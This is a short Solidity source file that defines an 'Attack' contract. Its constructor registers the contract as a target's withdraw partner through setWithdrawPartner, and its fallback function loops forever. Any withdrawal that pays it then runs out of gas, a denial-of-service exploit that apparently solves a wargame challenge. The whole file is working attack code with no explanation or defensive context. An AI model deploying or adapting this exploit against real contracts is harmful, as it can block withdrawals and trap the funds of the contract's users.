// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract Attack {
    address public target;
    constructor(address payable _addr)public payable{
        target=_addr;
        target.call(abi.encodeWithSignature("setWithdrawPartner(address)", address(this)));
    }

    fallback() payable external {
        while(true){
        }
    }
}
